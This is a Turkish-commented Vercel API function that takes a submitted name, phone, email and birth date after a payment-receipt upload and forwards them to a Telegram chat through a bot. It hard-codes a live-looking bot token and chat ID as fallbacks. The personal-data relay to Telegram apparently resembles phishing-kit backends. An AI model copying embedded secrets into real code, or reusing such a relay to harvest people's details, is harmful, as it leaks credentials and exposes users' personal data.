// api/send-dekont-notification.js

const axios = require('axios');

// Vercel ortam değişkenlerinden bilgileri okur, yoksa varsayılan değerleri kullan
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8074262861:AAEIhWsYk1YNUpxa1IsUpSKuqQlezmFBrIQ';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-1003220073247';

module.exports = async (req, res) => {
    // Sadece POST isteklerini işle
    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, message: 'Method Not Allowed' });
    }

    try {
        const {
            name,
            phone,
            email,
            birth_date
        } = req.body;

        // Gerekli alanları kontrol et
        if (!name || !phone || !email) {
            return res.status(400).json({ 
                success: false, 
                message: 'Eksik bilgi: name, phone ve email zorunludur.' 
            });
        }

        // Doğum tarihini formatla (dd.mm.yyyy)
        let formattedBirthDate = '';
        if (birth_date) {
            // Eğer zaten dd.mm.yyyy formatındaysa olduğu gibi kullan
            if (birth_date.match(/^\d{2}\.\d{2}\.\d{4}$/)) {
                formattedBirthDate = birth_date;
            } else {
                // Diğer formatları parse et
                const parts = birth_date.split(/[\/\-\.]/);
                if (parts.length === 3) {
                    // Yıl, ay, gün formatından gün, ay, yıl formatına çevir
                    // Eğer ilk kısım 4 haneli ise yıl, değilse gün
                    if (parts[0].length === 4) {
                        // yyyy-mm-dd formatı
                        formattedBirthDate = `${parts[2]}.${parts[1]}.${parts[0]}`;
                    } else {
                        // dd-mm-yyyy veya dd/mm/yyyy formatı
                        formattedBirthDate = `${parts[0]}.${parts[1]}.${parts[2]}`;
                    }
                } else {
                    formattedBirthDate = birth_date;
                }
            }
        }

        // Telegram'a gönderilecek mesaj (yeni format)
        const messageText = `✅ Dekont Yüklendi\n\n👤 Ad Soyad: ${name}\n\n📱 Telefon: ${phone}\n\n📧 E-posta: ${email}\n\n📅 Doğum Tarihi: ${formattedBirthDate || 'Belirtilmemiş'}`;

        const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        // Telegram'a mesajı gönderme isteği
        await axios.post(telegramApiUrl, {
            chat_id: CHAT_ID,
            text: messageText,
            parse_mode: 'Markdown', // Markdown formatı için
        });

        // Başarılı yanıt
        return res.status(200).json({ 
            success: true, 
            message: 'Dekont bildirimi gönderildi.'
        });

    } catch (error) {
        console.error('Send Dekont Notification Error:', error.message);
        return res.status(500).json({ 
            success: false, 
            message: 'Bildirim gönderilemedi.',
            error: error.message
        });
    }
};

